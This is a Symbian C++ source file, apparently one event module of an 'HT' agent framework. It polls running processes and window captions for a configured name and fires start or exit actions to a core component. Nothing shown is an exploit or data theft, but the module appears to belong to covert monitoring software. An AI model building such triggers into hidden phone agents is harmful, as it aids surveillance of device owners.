/*
 * EventProcess.cpp
 *
 *  Created on: 29/set/2010
 *      Author: Giovanna
 */

#include "EventProcess.h"
#include <HT\processes.h>
#include <APGWGNAM.H>

	
CEventProcess::CEventProcess(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Process, aTriggerId),iSecondsInterv(3)
	{
	// No implementation required
	}

CEventProcess::~CEventProcess()
	{
	__FLOG(_L("Destructor"));
	delete iTimer;
	delete iName;
	iWsSession.Close();
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CEventProcess* CEventProcess::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventProcess* self = new (ELeave) CEventProcess(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventProcess* CEventProcess::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventProcess* self = CEventProcess::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}
 
void CEventProcess::ConstructL(const TDesC8& params)
	{
	
	BaseConstructL(params);
	__FLOG_OPEN_ID("HT", "EventProcess.txt");
	__FLOG(_L("-------------"));
		
	TUint8* ptr = (TUint8 *)iParams.Ptr();
	Mem::Copy(&iProcessParams, iParams.Ptr(), sizeof(TProcessStruct));
	ptr += sizeof(TProcessStruct);
	
	iName = HBufC::NewL(iProcessParams.iNameLen);
	if (iProcessParams.iNameLen > 0)
		{
		TUint8 totChars = (iProcessParams.iNameLen-1) / 2;  //TODO: verify -1
		TPtr16 ptrNum((TUint16 *) ptr, totChars, totChars);
		iName->Des().Append(ptrNum);  
		}
	
	iTimer = CTimeOutTimer::NewL(*this);
	
	User::LeaveIfError(iWsSession.Connect());
	}

/**
 * StartEventL creates a list of active processes/GUI app that match criteria
 * If list element count > 0, starting action is triggered
 */
void CEventProcess::StartEventL()
	{
	__FLOG(_L("StartEventL()"));
	if(iProcessParams.iType == 0)
		{
		// search processes
		TFullName res;
		TFindProcess proc;
		while(proc.Next(res) == KErrNone)
			{
			RProcess ph;
			TInt err = ph.Open(proc);
			if(err!=KErrNone)
				{
				continue;
			    }
			if(ph.Name().MatchC(*iName) != KErrNotFound)
				{
				++iOldCount;
				}
			ph.Close();
			}
		}
	else
		{
		// Get a list of the names and IDs of the all the window groups
		CArrayFixFlat<TInt>* windowGroupIds = new(ELeave)CArrayFixFlat<TInt>(1);
		CleanupStack::PushL(windowGroupIds);
		
		CApaWindowGroupName* wgName=CApaWindowGroupName::NewL(iWsSession);
		CleanupStack::PushL(wgName);
			
		iWsSession.WindowGroupList(windowGroupIds);
		// Search for a pattern match
		TInt count = windowGroupIds->Count();
		TBuf<50> windowName;
		for(TInt i=0; i<count; i++)
			{
			wgName->ConstructFromWgIdL(((*windowGroupIds)[i]));
			windowName.Copy(wgName->Caption());
			//iWsSession.GetWindowGroupNameFromIdentifier((*windowGroupIds)[i],windowName);
			if(windowName.MatchC(*iName) != KErrNotFound)
				{
				++iOldCount;
				}
			}
		
		CleanupStack::PopAndDestroy(2);
		}
	
	// start timer
	iTimeAt.HomeTime();
	iTimeAt += iSecondsInterv;
	iTimer->At(iTimeAt);

	if(iOldCount>0)
		SendActionTriggerToCoreL();
	
	}


/*
 * TimerExpiredL
 * We are only interested into the following matrix:
 * (old list count = 0)  && (new list count > 0) => trigger the action
 * (old list count = 0)  && (new list count > 0) => do nothing
 * (old list count > 0)  && (new list count > 0) => do nothing
 * (old list count > 0)  && (new list count = 0) => trigger exit action
 */
void CEventProcess::TimerExpiredL(TAny* /*src*/)
	{
	iNewCount = 0;
	if(iProcessParams.iType == 0)
		{
		// process case
		// search processes
		TFullName res;
		TFindProcess proc;
		while(proc.Next(res) == KErrNone)
			{
			RProcess ph;
			TInt err = ph.Open(proc);
			if(err!=KErrNone)
				{
				continue;
			    }
			if(ph.Name().MatchC(*iName) != KErrNotFound)
				{
				++iNewCount;
				}
			ph.Close();
			}
		}
	else
		{
		// GUI app case
		// Get a list of the names and IDs of the all the window groups
		CArrayFixFlat<TInt>* windowGroupIds = new(ELeave)CArrayFixFlat<TInt>(1);
		CleanupStack::PushL(windowGroupIds);
		
		CApaWindowGroupName* wgName=CApaWindowGroupName::NewL(iWsSession);
		CleanupStack::PushL(wgName);
			
		iWsSession.WindowGroupList(windowGroupIds);
		// Search for a pattern match
		TInt count = windowGroupIds->Count();
		TBuf<50> windowName;
		for(TInt i=0; i<count; i++)
			{
			wgName->ConstructFromWgIdL(((*windowGroupIds)[i]));
			windowName.Copy(wgName->Caption());
			//iWsSession.GetWindowGroupNameFromIdentifier((*windowGroupIds)[i],windowName);
			if(windowName.MatchC(*iName) != KErrNotFound)
				{
				++iNewCount;
				}
			}
		
		CleanupStack::PopAndDestroy(2);
	
		}
	
	//(old list count = 0)  && (new list count > 0) => trigger the action
	if((iOldCount==0) && (iNewCount>0) )
		SendActionTriggerToCoreL();
	else if((iOldCount>0) && (iNewCount == 0))   //(old list count > 0)  && (new list count = 0) => trigger exit action
		{
		if (iProcessParams.iExitAction != 0xFFFFFFFF)						
			SendActionTriggerToCoreL(iProcessParams.iExitAction);						
		}
			
	iOldCount = iNewCount;
			
	// restart timer
	iTimeAt.HomeTime();
	iTimeAt += iSecondsInterv;
	iTimer->At(iTimeAt);
	}

